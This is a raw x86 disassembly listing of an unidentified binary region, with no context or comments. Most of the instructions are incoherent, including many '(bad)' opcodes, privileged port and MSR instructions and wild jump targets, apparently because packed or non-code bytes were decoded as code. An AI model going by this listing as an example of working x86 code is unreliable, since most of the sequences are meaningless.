  426e44:	sbb    BYTE PTR [ecx],cl
  426e46:	jns    0x426dfd
  426e48:	cwde   
  426e49:	out    0x30,eax
  426e4b:	mov    esp,0xc3c09963
  426e50:	push   es
  426e51:	out    dx,al
  426e52:	sbb    edx,DWORD PTR [ebx-0x3a]
  426e55:	xor    al,0x87
  426e57:	jmp    0x1fdcc882
  426e5c:	cmp    eax,0x54001699
  426e61:	into   
  426e62:	jle    0x426ed5
  426e64:	mov    al,ds:0x7471632c
  426e69:	mov    ds:0x6381bcca,al
  426e6e:	(bad)  
  426e6f:	jbe    0x426eab
  426e71:	sub    DWORD PTR [ebp+0x1aad1de],0x71a668b1
  426e7b:	dec    edi
  426e7c:	(bad)  
  426e7d:	or     esp,ebx
  426e7f:	sti    
  426e80:	fwait
  426e81:	mov    ch,0x58
  426e83:	jmp    FWORD PTR [edi+eax*8-0x6f902dc]
  426e8a:	mov    dl,0x9a
  426e8c:	sbb    ebx,DWORD PTR [esi-0xd59ee1d]
  426e92:	scas   al,BYTE PTR es:[edi]
  426e93:	dec    eax
  426e94:	dec    ecx
  426e95:	mul    DWORD PTR [edx+0x36]
  426e98:	mov    esp,0x896b7b39
  426e9d:	mov    cl,0xd2
  426e9f:	ds push ebx
  426ea1:	pop    edx
  426ea2:	int3   
  426ea3:	bound  edx,QWORD PTR [esi-0x20]
  426ea6:	in     ax,dx
  426ea8:	sti    
  426ea9:	ret    
  426eaa:	js     0x426e56
  426eac:	add    al,0xf4
  426eae:	sahf   
  426eaf:	mov    bl,0xc2
  426eb1:	or     al,0x97
  426eb3:	pusha  
  426eb4:	mov    cl,0x64
  426eb6:	scas   al,BYTE PTR es:[edi]
  426eb7:	(bad)  
  426eb8:	in     eax,0xbf
  426eba:	push   es
  426ebb:	mov    ch,0xd3
  426ebd:	push   edi
  426ebe:	inc    BYTE PTR [edx-0x67d9ec5d]
  426ec4:	xchg   edi,eax
  426ec5:	imul   eax,DWORD PTR [ebx],0x752c2925
  426ecb:	push   0xffffffcf
  426ecd:	mov    esp,0x4c5b4dba
  426ed2:	mov    eax,ds:0xe64c1e04
  426ed7:	and    DWORD PTR [ecx+0x506ea765],esp
  426edd:	xchg   esp,eax
  426ede:	dec    esp
  426edf:	cld    
  426ee0:	fcomip st,st(0)
  426ee2:	out    dx,eax
  426ee3:	ins    DWORD PTR es:[edi],dx
  426ee4:	shl    BYTE PTR [esi+edi*1],cl
  426ee7:	push   edx
  426ee8:	in     al,dx
  426ee9:	fwait
  426eea:	pop    esp
  426eeb:	imul   eax,eax,0x265d21af
  426ef1:	push   ecx
  426ef2:	in     eax,0x4b
  426ef4:	hlt    
  426ef5:	xchg   edi,eax
  426ef6:	sti    
  426ef7:	cwde   
  426ef8:	mov    dh,al
  426efa:	lods   al,BYTE PTR ds:[esi]
  426efb:	aad    0xe3
  426efd:	jl     0x426ef5
  426eff:	xchg   esi,eax
  426f00:	dec    edi
  426f01:	inc    ebp
  426f02:	inc    ebp
  426f03:	sub    cl,BYTE PTR [esi-0x3a]
  426f06:	(bad)  
  426f07:	clc    
  426f08:	test   al,0xeb
  426f0a:	sbb    BYTE PTR [ebx+0x3e0af00a],cl
  426f10:	add    BYTE PTR ds:0x7752380c,0x51
  426f17:	into   
  426f18:	shl    ah,cl
  426f1a:	cld    
  426f1b:	rcr    BYTE PTR [ebp-0x37],cl
  426f1e:	aam    0x72
  426f20:	inc    esp
  426f21:	das    
  426f22:	mov    ebx,0xb58826d4
  426f27:	(bad)  
  426f28:	and    al,BYTE PTR [edx]
  426f2a:	lods   al,BYTE PTR ds:[esi]
  426f2b:	xchg   edx,eax
  426f2c:	aas    
  426f2d:	in     eax,dx
  426f2e:	xchg   ecx,eax
  426f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f30:	cli    
  426f31:	mov    esi,0xcd84b362
  426f36:	test   dl,dh
  426f38:	aad    0xdf
  426f3a:	sbb    DWORD PTR [edi],eax
  426f3c:	inc    edx
  426f3d:	ret    0x8341
  426f40:	mov    cl,BYTE PTR [edi-0x67]
  426f43:	push   ds
  426f44:	jmp    0x4905ca50
  426f49:	push   ds
  426f4a:	cwde   
  426f4b:	fidivr DWORD PTR ds:0xf94403bb
  426f51:	pop    ebp
  426f52:	jne    0x426f50
  426f54:	lods   al,BYTE PTR ds:[esi]
  426f55:	sub    BYTE PTR [eax],ah
  426f57:	xor    al,0x6f
  426f59:	imul   edx,DWORD PTR [esi+0x2b848275],0xfe61663c
  426f63:	ret    
  426f64:	cmc    
  426f65:	(bad)  
  426f66:	pop    ecx
  426f67:	pop    DWORD PTR [ecx]
  426f69:	sub    bl,dl
  426f6b:	dec    ebp
  426f6c:	cld    
  426f6d:	mov    bh,0xe3
  426f6f:	lds    esp,FWORD PTR [esi+0x6ef375ff]
  426f75:	pushf  
  426f76:	sub    al,0xa4
  426f78:	shr    BYTE PTR [esi-0x7f],0x56
  426f7c:	xchg   bl,al
  426f7e:	scas   eax,DWORD PTR es:[edi]
  426f7f:	(bad)  
  426f80:	in     eax,dx
  426f81:	int    0x58
  426f83:	add    DWORD PTR [esi+0x6b],esi
  426f86:	and    al,0xd9
  426f88:	lahf   
  426f89:	mov    al,ds:0x34ab4a5f
  426f8e:	jge    0x426fa7
  426f90:	sbb    eax,0x45631b5a
  426f95:	mov    ds:0xfbef568a,al
  426f9a:	(bad)  
  426f9b:	lahf   
  426f9c:	mov    edi,DWORD PTR [ebp-0xd]
  426f9f:	in     al,dx
  426fa0:	xor    eax,0xd89b8015
  426fa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fa6:	rcl    DWORD PTR [edx+ebx*1-0x296f5452],0x7b
  426fae:	mov    cl,0xd0
  426fb0:	jge    0x427011
  426fb2:	aad    0xef
  426fb4:	inc    edi
  426fb5:	push   es
  426fb6:	push   0xfffffff8
  426fb8:	jns    0x426f40
  426fba:	mov    dh,0xdc
  426fbc:	(bad)  
  426fbd:	push   ecx
  426fbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fbf:	pop    ecx
  426fc0:	out    dx,al
  426fc1:	xchg   ecx,eax
  426fc2:	std    
  426fc3:	imul   ebx,DWORD PTR [edx],0xffffffe5
  426fc6:	add    DWORD PTR [esi+0x62df51f],eax
  426fcc:	sbb    edx,DWORD PTR [eax]
  426fce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426fcf:	xor    ah,BYTE PTR ds:0x53241ac
  426fd5:	ror    ebp,cl
  426fd7:	adc    eax,ebp
  426fd9:	mov    cl,0x86
  426fdb:	cmp    eax,0x73c70915
  426fe0:	pusha  
  426fe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426fe2:	sbb    al,0xb4
  426fe4:	sti    
  426fe5:	out    dx,al
  426fe6:	dec    eax
  426fe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426fe8:	arpl   WORD PTR [ecx+0x7e],dx
  426feb:	test   DWORD PTR [ebx],edi
  426fed:	ss inc ebx
  426fef:	out    0x74,eax
  426ff1:	and    al,0x4b
  426ff3:	cmp    DWORD PTR [eax+0x38],esi
  426ff6:	jb     0x427001
  426ff8:	xor    ah,BYTE PTR [esi]
  426ffa:	call   0xc3806237
  426fff:	inc    esp
  427000:	add    ch,bh
  427002:	repnz enter 0x1f0a,0xcd
  427007:	mov    eax,0xdfb57a60
  42700c:	dec    esi
  42700d:	jmp    0x2a331c66
  427012:	imul   esp,DWORD PTR [ecx-0x7e5c770a],0x8b4cf2b5
  42701c:	pop    es
  42701d:	add    ebx,DWORD PTR [ecx+0x49d3c77b]
  427023:	dec    edx
  427024:	vmwrite esi,DWORD PTR [ecx]
  427027:	sbb    al,0x69
  427029:	dec    ecx
  42702a:	in     al,dx
  42702b:	push   esp
  42702c:	pop    edx
  42702d:	gs adc al,BYTE PTR cs:[edx+ecx*2-0x18c5e26a]
  427036:	ins    DWORD PTR es:[edi],dx
  427037:	xchg   esi,eax
  427038:	aaa    
  427039:	imul   edx,DWORD PTR [esi-0x45],0xdc69a9d3
  427040:	jae    0x426fef
  427042:	mov    ds:0xcb647c94,eax
  427047:	in     al,0x7d
  427049:	jle    0x427044
  42704b:	or     al,0x7f
  42704d:	dec    esp
  42704e:	mov    fs,WORD PTR [esi]
  427050:	dec    edx
  427051:	push   0x75
  427053:	adc    edx,DWORD PTR [esi-0x6c7e87cb]
  427059:	xchg   ebx,eax
  42705a:	std    
  42705b:	into   
  42705c:	fistp  DWORD PTR ds:0x63e08c76
  427062:	push   cs
  427063:	sahf   
  427064:	inc    eax
  427065:	leave  
  427066:	xchg   ecx,eax
  427067:	into   
  427068:	adc    ebp,ecx
  42706a:	pop    ecx
  42706b:	iret   
  42706c:	popf   
  42706d:	xchg   edx,eax
  42706e:	mov    dl,0x8c
  427070:	pop    edx
  427071:	aad    0xd7
  427073:	mov    eax,0x912ec205
  427078:	mov    WORD PTR [eax-0x4],gs
  42707b:	mov    edx,0x2553e2fe
  427080:	mov    ch,BYTE PTR [ebx-0x3f2ebcf7]
  427086:	adc    al,0x9d
  427088:	xchg   ebx,eax
  427089:	daa    
  42708a:	adc    eax,0x55148e53
  42708f:	adc    DWORD PTR [edi],esi
  427091:	xchg   edx,eax
  427092:	sub    BYTE PTR [edx+0x425ae3c6],dh
  427098:	jmp    0x25e5:0x5189b520
  42709f:	and    bl,ch
  4270a1:	sbb    BYTE PTR [edi+0x68],dh
  4270a4:	or     eax,0xfbed880e
  4270a9:	fcmovbe st,st(4)
  4270ab:	retf   0x17e9
  4270ae:	shl    dh,cl
  4270b0:	fistp  QWORD PTR [edx+0x52aa7cb6]
  4270b6:	repnz mov bh,0x26
  4270b9:	pop    eax
  4270ba:	or     DWORD PTR [edx-0x19],ecx
  4270bd:	lods   al,BYTE PTR ds:[esi]
  4270be:	pop    eax
  4270bf:	mov    al,0xb
  4270c1:	sub    DWORD PTR [eax+0x4e],0xffffff9c
  4270c5:	stos   DWORD PTR es:[edi],eax
  4270c6:	fwait
  4270c7:	add    ah,BYTE PTR ds:0xa69b25ba
  4270cd:	test   DWORD PTR [esi],esi
  4270cf:	or     DWORD PTR ds:[edi-0x5],0xdee3eaa
  4270d7:	cwde   
  4270d8:	inc    eax
  4270d9:	mov    ah,0x72
  4270db:	rcr    BYTE PTR [ebp-0x514a0abe],cl
  4270e1:	push   edi
  4270e2:	loopne 0x427085
  4270e4:	and    edx,eax
  4270e6:	push   esp
  4270e7:	pop    edi
  4270e8:	stc    
  4270e9:	in     al,dx
  4270ea:	dec    edi
  4270eb:	add    ebx,edx
  4270ed:	stc    
  4270ee:	dec    edx
  4270ef:	xchg   edx,eax
  4270f0:	pop    ds
  4270f1:	jmp    DWORD PTR [edi]
  4270f3:	add    eax,0x5111bff0
  4270f8:	jo     0x427141
  4270fa:	push   ss
  4270fb:	nop
  4270fc:	push   esi
  4270fd:	arpl   WORD PTR [ebx+0x6af3ea98],bp
  427103:	popa   
  427104:	arpl   WORD PTR [esi+0x49fc4540],ax
  42710a:	leave  
  42710b:	fcmovnb st,st(6)
  42710d:	mov    DWORD PTR [ecx],edx
  42710f:	scas   eax,DWORD PTR es:[edi]
  427110:	sub    ebp,eax
  427112:	inc    edx
  427113:	ins    BYTE PTR es:[edi],dx
  427114:	xchg   edi,eax
  427115:	test   bl,al
  427117:	cmp    BYTE PTR [ecx-0x51],al
  42711a:	cmp    eax,0x7df773d7
  42711f:	mov    ebx,0x64baeab1
  427124:	dec    ecx
  427125:	mov    BYTE PTR [ebp-0x3d],bl
  427128:	(bad)
  42712c:	mov    edi,esp
  42712e:	cmc    
  42712f:	and    ch,BYTE PTR [ecx+esi*8-0x256bcd49]
  427136:	xlat   BYTE PTR ds:[ebx]
  427137:	mov    esi,0x1ff84a87
  42713c:	adc    cl,0x59
  42713f:	bound  eax,QWORD PTR [ebx-0x11]
  427142:	dec    esi
  427143:	ret    0x3379
  427146:	jmp    0x427168
  427148:	jne    0x4270cb
  42714a:	call   0x8b643645
  42714f:	cmp    DWORD PTR [edi],ecx
  427151:	mov    eax,ds:0x1c980452
  427156:	pop    eax
  427157:	xor    DWORD PTR [esi-0x1],esi
  42715a:	test   DWORD PTR [esi],edi
  42715c:	inc    esp
  42715d:	fdivr  DWORD PTR [edi+ecx*4+0x3f]
  427161:	mov    edx,0x50ea0c67
  427166:	out    dx,eax
  427167:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427168:	xchg   esp,eax
  427169:	dec    edx
  42716a:	sub    BYTE PTR [edi],dl
  42716c:	cmp    bl,BYTE PTR [ebp-0x1d97e4b8]
  427172:	and    al,0x9d
  427174:	iret   
  427175:	jmp    0x427145
  427177:	cdq    
  427178:	call   0x14dc6cfe
  42717d:	sub    eax,DWORD PTR [esi-0x29226c9e]
  427183:	cmp    ch,BYTE PTR [ebx]
  427185:	shl    BYTE PTR [ecx-0x140ab9c3],1
  42718b:	inc    edi
  42718c:	jecxz  0x42710f
  42718e:	jg     0x42720f
  427190:	push   esp
  427191:	aam    0xdc
  427193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427194:	cmp    al,0xee
  427196:	sahf   
  427197:	fstp   TBYTE PTR [eax+0x4f]
  42719a:	mov    al,0x5f
  42719c:	dec    edx
  42719d:	cmp    ch,BYTE PTR [esi-0x51c45d8d]
  4271a3:	and    al,0x4a
  4271a5:	inc    esp
  4271a6:	xor    eax,0xfc1a14fe
  4271ab:	fnstsw WORD PTR [ebp-0x7b]
  4271ae:	repnz outs dx,BYTE PTR ds:[esi]
  4271b0:	jp     0x42715b
  4271b2:	psrad  mm6,mm7
  4271b5:	adc    DWORD PTR [edx],edi
  4271b7:	jecxz  0x4271d7
  4271b9:	sbb    bl,BYTE PTR [eax]
  4271bb:	lods   eax,DWORD PTR ds:[esi]
  4271bc:	cld    
  4271bd:	mov    ebp,DWORD PTR [edx-0x2ae7e18]
  4271c3:	xchg   DWORD PTR [edx+0x71],esp
  4271c6:	cmp    BYTE PTR [esi-0x38],dh
  4271c9:	ds dec esp
  4271cb:	xor    esi,DWORD PTR [ebx+eiz*2+0x77eeee5b]
  4271d2:	imul   esp,eax,0xffffffe7
  4271d5:	sti    
  4271d6:	adc    BYTE PTR [ecx+0x2],ch
  4271d9:	cdq    
  4271da:	data16 sbb BYTE PTR [ecx+0x58f60d0c],ah
  4271e1:	cwde   
  4271e2:	push   ebp
  4271e3:	fadd   DWORD PTR [eax+0x4a]
  4271e6:	mov    ds:0x6f4520d9,eax
  4271eb:	push   eax
  4271ec:	jae    0x42722a
  4271ee:	imul   ecx,DWORD PTR [ebx+0x3eb5b3b8],0x6
  4271f5:	or     DWORD PTR [ecx+0x4c],ebp
  4271f8:	jmp    0x4271e5
  4271fa:	push   edi
  4271fb:	cmc    
  4271fc:	ss loope 0x427200
  4271ff:	sub    DWORD PTR [eax],ebp
  427201:	mov    ds:0x893f767e,eax
  427206:	in     al,dx
  427207:	and    al,0xd3
  427209:	dec    eax
  42720a:	fcomp  DWORD PTR [eax+0x55]
  42720d:	ret    0x73f4
  427210:	jecxz  0x4271ba
  427212:	clc    
  427213:	mov    al,ds:0x32406c1f
  427218:	lods   al,BYTE PTR ds:[esi]
  427219:	mov    bh,0xe0
  42721b:	rcl    DWORD PTR [esp+ebx*8-0x44],0xa4
  427220:	inc    esp
  427221:	fcmovu st,st(2)
  427223:	push   esi
  427224:	mov    ah,BYTE PTR [edi+0x78]
  427227:	scas   al,BYTE PTR es:[edi]
  427228:	inc    edi
  427229:	popa   
  42722a:	pop    ecx
  42722b:	dec    edi
  42722c:	dec    esi
  42722d:	dec    ebp
  42722e:	pop    esi
  42722f:	dec    ebp
  427230:	pop    ebx
  427231:	pop    edi
  427232:	in     eax,dx
  427233:	fld    st(4)
  427235:	shr    BYTE PTR [ecx-0xf9badbd],0xff
  42723c:	add    DWORD PTR [eax],eax
  42723e:	push   es
  42723f:	add    BYTE PTR [eax],al
  427241:	add    BYTE PTR [ebx],bh
  427243:	jo     0x427266
  427245:	mov    DWORD PTR [ecx-0x3],ebp
  427248:	add    BYTE PTR [eax],al
  42724a:	dec    ebp
  42724b:	push   ebp
  42724c:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  427252:	mov    esp,ebp
  427254:	or     al,ah
  427256:	dec    ebp
  427257:	add    bh,al
  427259:	add    BYTE PTR [eax],cl
  42725b:	add    BYTE PTR [eax],al
  42725d:	mov    DWORD PTR [eax],0x3ef44545
  427263:	cmp    BYTE PTR [eax],al
  427265:	test   DWORD PTR [ebx-0x34070b64],ecx
  42726b:	(bad)  
  42726c:	enter  0x4d45,0xb8
  427270:	mov    edi,DWORD PTR [ecx]
  427272:	hlt    
  427273:	test   ebx,ecx
  427275:	pushf  
  427276:	enter  0x4df8,0x8b
  42727a:	mov    DWORD PTR [ebp+0x8],0x894708
  427281:	inc    ebp
  427282:	mov    ebp,0xff8bfffc
  427287:	dec    ebp
  427288:	mov    ch,0xf4
  42728a:	call   DWORD PTR [ebx-0x1]
  42728d:	mov    ebx,0x8005022
  427292:	call   DWORD PTR [ecx+0x8]
  427295:	pop    es
  427296:	jmp    0xb8:0x9cb4533
  42729d:	cwde   
  42729e:	mov    esi,DWORD PTR [edx-0xc]
  4272a1:	xor    al,bl
  4272a3:	add    BYTE PTR [eax+0x3c83203],bl
  4272a9:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  4272af:	mov    eax,DWORD PTR [ebx-0xb87b3]
  4272b5:	xor    eax,DWORD PTR [eax]
  4272b7:	retf   
  4272b8:	ret    
  4272b9:	add    eax,esi
  4272bb:	enter  0x8945,0x64
  4272bf:	dec    ebp
  4272c0:	sbb    ah,cl
  4272c2:	add    BYTE PTR [ebx-0xb87b277],cl
  4272c8:	dec    DWORD PTR [ebx-0xbcfb275]
  4272ce:	test   DWORD PTR [ebx],esi
  4272d0:	dec    ebx
  4272d2:	inc    DWORD PTR [ebx]
  4272d4:	inc    eax
  4272d5:	enter  0x8989,0x64
  4272d9:	(bad)  
  4272da:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4272de:	cld    
  4272df:	dec    DWORD PTR [ebp-0xa90001]
  4272e5:	push   edi
  4272e6:	mov    BYTE PTR [edx+0x1],ch
  4272e9:	and    BYTE PTR [eax],al
  4272eb:	pop    ecx
  4272ec:	inc    ebp
  4272ed:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4272f3:	push   0xffffff89
  4272f5:	pop    ecx
  4272f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272f7:	dec    ebp
  4272f8:	add    BYTE PTR [ecx+0x45fc088b],cl
  4272fe:	jne    0x427348
  427300:	lea    eax,[eax]
  427302:	fs (bad) 
  427304:	dec    DWORD PTR [eax]
  427306:	mov    DWORD PTR [eax],eax
  427308:	test   al,0x0
  42730a:	add    BYTE PTR [ebp-0x18],cl
  42730d:	xor    ebp,DWORD PTR [edx]
  42730f:	add    eax,DWORD PTR [eax]
  427311:	mov    eax,eax
  427313:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  42731a:	inc    ebp
  42731b:	mov    DWORD PTR [ebx+0x459408],ecx
  427321:	popa   
  427322:	mov    esp,DWORD PTR [ebp-0x75]
  427325:	(bad)  
  427326:	cld    
  427327:	inc    eax
  427328:	cmp    bh,0x1
  42732b:	lea    eax,[eax]
  42732d:	and    BYTE PTR [eax],al
  42732f:	inc    DWORD PTR [ecx-0x18]
  427332:	mov    ecx,DWORD PTR [ebx]
  427334:	cld    
  427335:	add    BYTE PTR [ecx+0x75014d],cl
  42733b:	(bad)  
  42733c:	xchg   ebp,eax
  42733d:	sar    bh,1
  42733f:	inc    eax
  427340:	inc    DWORD PTR [eax]
  427342:	mov    eax,DWORD PTR [ebp-0x4]
  427345:	xor    edx,DWORD PTR [edx+0x7201be]
  42734b:	add    BYTE PTR [edx],dl
  42734d:	(bad)  
  42734e:	nop
  42734f:	inc    ebp
  427350:	add    BYTE PTR [ebx-0x5afb0c00],cl
  427356:	mov    al,0xff
  427358:	add    bh,bh
  42735a:	add    BYTE PTR [ebx],dh
  42735c:	inc    DWORD PTR [ebx]
  42735e:	sbb    al,0x89
  427360:	jne    0x42733e
  427362:	mov    esp,DWORD PTR [ecx+0x4500fc]
  427368:	mov    eax,DWORD PTR [ebp-0xff0048]
  42736e:	mov    DWORD PTR [eax-0x70],0xee70ed89
  427375:	inc    DWORD PTR [ebp-0x75]
  427378:	fisttp QWORD PTR [eax+ebp*8]
  42737b:	test   DWORD PTR [esi-0x1],esp
  42737e:	inc    ebp
  42737f:	(bad)  
  427380:	aas    
  427381:	inc    ebp
  427382:	(bad)  
  427383:	lea    edi,[eax+edi*2-0x1]
  427387:	inc    edi
  427389:	mov    DWORD PTR ds:0x8000c7a0,edi
  42738f:	mov    ebp,esi
  427391:	cld    
  427392:	in     al,0x8d
  427394:	inc    ebp
  427395:	(bad)  
  427396:	call   0xc7cb539a
  42739b:	add    DWORD PTR [eax-0x11ba1500],ecx
  4273a1:	inc    DWORD PTR [ebp-0x4]
  4273a4:	out    0x8d,eax
  4273a6:	aas    
  4273a7:	(bad)  
  4273a8:	call   0xca9eac
  4273ad:	add    DWORD PTR [ebx-0x7f570400],ecx
  4273b3:	add    BYTE PTR [ecx],al
  4273b5:	test   DWORD PTR [eax],eax
  4273b7:	wrmsr  
  4273b9:	jae    0x4273a8
  4273bb:	add    BYTE PTR [eax],al
  4273bd:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  4273c3:	add    esp,edi
  4273c5:	add    BYTE PTR [eax+0x450108],al
  4273cb:	mov    edi,DWORD PTR [ebp-0x6c]
  4273ce:	add    DWORD PTR [eax],0x4
  4273d1:	mov    eax,DWORD PTR [ebp+0x3]
  4273d4:	mov    edi,DWORD PTR [esp+edi*8]
  4273d7:	dec    ebp
  4273d8:	nop
  4273d9:	mov    eax,DWORD PTR [ecx]
  4273db:	fadd   DWORD PTR [eax]
  4273dd:	add    BYTE PTR [esi],al
  4273df:	lea    eax,[eax]
  4273e1:	pusha  
  4273e2:	push   eax
  4273e3:	inc    DWORD PTR [ebp+0x52]
  4273e6:	call   DWORD PTR [ebp-0x7b]
  4273e9:	mov    esi,DWORD PTR [ebp-0x74]
  4273ec:	mov    eax,DWORD PTR [eax]
  4273ee:	cld    
  4273ef:	mov    eax,DWORD PTR [eax+0x880103]
  4273f5:	add    BYTE PTR [ebp+0x6a],bh
  4273f8:	cmp    edi,0x10
  4273fb:	mov    WORD PTR [ebp+0x0],es
  4273fe:	mov    edx,DWORD PTR [edx-0x4]
  427401:	push   ecx
  427402:	nop
  427403:	inc    DWORD PTR [ecx]
  427405:	cld    
  427406:	add    BYTE PTR [ebp-0x24],bh
  427409:	mov    eax,DWORD PTR [eax]
  42740b:	cld    
  42740c:	push   eax
  42740d:	nop
  42740e:	inc    ebp
  42740f:	add    edi,edi
  427411:	add    BYTE PTR [ebx+0x4de4f445],cl
  427417:	in     al,dx
  427418:	xor    eax,edi
  42741a:	add    edx,DWORD PTR [ebx+edi*1+0x36e70feb]
  427421:	mov    DWORD PTR [eax],0xb8788b98
  427427:	test   ebx,eax
  427429:	jmp    FWORD PTR [eax-0x1]
  42742c:	int    0xed
  42742e:	sub    esp,eax
  427430:	add    eax,DWORD PTR [ebp-0x30]
  427433:	fild   WORD PTR [ebp+0x3f]
  427436:	cmp    eax,edi
  427438:	je     0xca43545a
  42743e:	mov    DWORD PTR [ebp-0x28],0xe300f3
  427445:	(bad)  
  427446:	jne    0x4273d4
  427448:	mov    ebx,ebp
  42744a:	cld    
  42744b:	js     0x427492
  42744d:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  427453:	inc    ebp
  427454:	call   0xea9de4
  427459:	add    BYTE PTR [ebx-0x7f170301],cl
  42745f:	add    DWORD PTR es:[eax],eax
  427462:	add    al,al
  427464:	xor    BYTE PTR [eax+0x41],dl
  427467:	inc    ebp
  427468:	add    BYTE PTR [ebx+0xfcd88b],cl
  42746e:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  427474:	add    DWORD PTR [ecx+0x458be845],ecx
  42747a:	fmul   DWORD PTR [ebx+0x8bb800]
  427480:	cld    
  427481:	call   0xd79f46
  427486:	dec    DWORD PTR [ebx+0x1090e8ff]
  42748c:	add    al,al
  42748e:	push   eax
  42748f:	es inc ebp
  427491:	inc    ebp
  427492:	mov    ecx,DWORD PTR [ebx+0xd89c]
  427498:	dec    DWORD PTR [ebx-0x3ff70301]
  42749e:	mov    DWORD PTR gs:[eax],eax
  4274a1:	call   0x8b6aba66
  4274a6:	inc    ebp
  4274a7:	mov    eax,0xe8d8008b
  4274ac:	add    BYTE PTR [ecx],ch
  4274ae:	mov    eax,DWORD PTR [eax]
  4274b0:	cld    
  4274b1:	mov    eax,eax
  4274b3:	call   0x462a850d
  4274b8:	sub    DWORD PTR [ebx-0x3c743000],ecx
  4274be:	cld    
  4274bf:	mov    BYTE PTR [eax+0x8401c1],0x1
  4274c6:	xor    BYTE PTR [eax],al
  4274c8:	push   edi
  4274c9:	inc    ebp
  4274ca:	mov    DWORD PTR [ebx],esi
  4274cc:	in     al,0xb9
  4274ce:	inc    ebp
  4274cf:	lea    ecx,[ebx-0x3c370301]
  4274d5:	dec    ebp
  4274d6:	cwde   
  4274d7:	mov    esi,DWORD PTR [edx]
  4274d9:	or     BYTE PTR [ebx],al
  4274db:	ror    DWORD PTR [ebp-0xfebf79],0x0
  4274e2:	call   0x429e2c
  4274e7:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4274ed:	jge    0x427522
  4274ef:	mov    eax,DWORD PTR [ebx]
  4274f1:	cld    
  4274f2:	lea    edx,[eax+0xff0120]
  4274f8:	call   0x429e8c
  4274fd:	push   eax
  4274fe:	inc    DWORD PTR [ebp-0x1c]
  427501:	mov    ecx,DWORD PTR [ebp-0x58]
  427504:	xor    eax,DWORD PTR [eax]
  427506:	add    edi,edi
  427508:	cmp    ebp,eax
  42750a:	jne    0x427532
  42750c:	mov    DWORD PTR [eax],0x8b004dd8
  427512:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  427519:	mov    eax,ebx
  42751b:	cld    
  42751c:	test   BYTE PTR [eax+0x320198],bh
  427522:	mov    DWORD PTR [ebp+0x8],esi
  427525:	xor    eax,DWORD PTR [ebp-0x73]
  427528:	test   DWORD PTR [esp+esi*2-0x1],edi
  42752c:	mov    ebp,eax
  42752e:	mov    eax,0x33004d29
  427533:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  427539:	add    DWORD PTR [eax],eax
  42753b:	add    BYTE PTR [ebp+0x30],al
  42753e:	mov    edx,DWORD PTR [edi-0x48]
  427541:	add    ebx,0xffffffe4
  427544:	push   0x2b74cd85
  427549:	mov    eax,DWORD PTR [ebx]
  42754b:	cld    
  42754c:	sar    BYTE PTR [eax+0x3b0145],1
  427552:	pcmpeqw mm4,mm6
  427555:	xor    edi,edi
  427557:	lea    ecx,[ebx-0x239c7470]
  42755d:	add    BYTE PTR [ebp+0x50],cl
  427560:	cmp    eax,DWORD PTR [ebp+0x75]
  427563:	mov    ebp,DWORD PTR [eax-0x68]
  427566:	test   DWORD PTR [eax],eax
  427568:	clc    
  427569:	push   DWORD PTR [ebp-0x1]
  42756c:	lea    ecx,[eax]
  42756e:	int3   
  42756f:	inc    ebp
  427570:	call   0xfaa600
  427575:	jne    0x42756f
  427577:	xor    edi,DWORD PTR [ebp-0x41]
  42757a:	jmp    0x4275ee
  42757c:	mov    eax,DWORD PTR [eax]
  42757e:	mov    eax,0x339545c7
  427583:	inc    DWORD PTR [ebx]
  427585:	push   DWORD PTR [ecx]
  427587:	aaa    
  427588:	mov    eax,DWORD PTR [eax]
  42758a:	jmp    0x4275dc
  42758c:	mov    eax,DWORD PTR [ebp-0x3c]
  42758f:	mov    eax,eax
  427591:	cld    
  427592:	clc    
  427593:	ret    
  427594:	test   bh,al
  427596:	pop    es
  427597:	xchg   ebp,eax
  427598:	add    bh,bh
  42759a:	inc    ebp
  42759b:	dec    DWORD PTR [edi]
  42759d:	and    DWORD PTR [ebx],ebp
  42759f:	add    BYTE PTR [eax],al
  4275a1:	push   eax
  4275a2:	jbe    0x4275f9
  4275a4:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  4275aa:	or     al,0xcf
  4275ac:	inc    eax
  4275ad:	enter  0x745,0x72
  4275b1:	inc    ebp
  4275b2:	mov    eax,DWORD PTR [ecx]
  4275b4:	int3   
  4275b5:	add    BYTE PTR [ebp-0x75],al
  4275b8:	cmp    BYTE PTR [eax+0x33c74d9c],bh
  4275be:	ror    BYTE PTR [ebp+0x72f80885],1
  4275c4:	inc    ebp
  4275c5:	add    BYTE PTR [ebx-0x3c7423bb],cl
  4275cb:	fadd   st,st(6)
  4275cd:	rol    BYTE PTR [ebp+0x12],0x8b
  4275d1:	inc    ebp
  4275d2:	fmul   QWORD PTR [ebx-0x3c39233d]
  4275d8:	inc    ebp
  4275d9:	test   bh,al
  4275db:	cwde   
  4275dc:	clc    
  4275dd:	xor    al,BYTE PTR [ebp+0x45dcf889]
  4275e3:	inc    ebp
  4275e4:	cmp    dh,BYTE PTR [ebx]
  4275e6:	pushf  
  4275e7:	mov    ecx,0xffb48dc7
  4275ec:	test   eax,ecx
  4275ee:	clc    
  4275ef:	dec    ebp
  4275f0:	inc    ebp
  4275f1:	mov    edi,DWORD PTR [eax+ecx*1]
  4275f4:	pushf  
  4275f5:	rol    edi,0x86
  4275f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275f9:	inc    BYTE PTR [ebp+0x45f7f8ff]
  4275ff:	inc    ebp
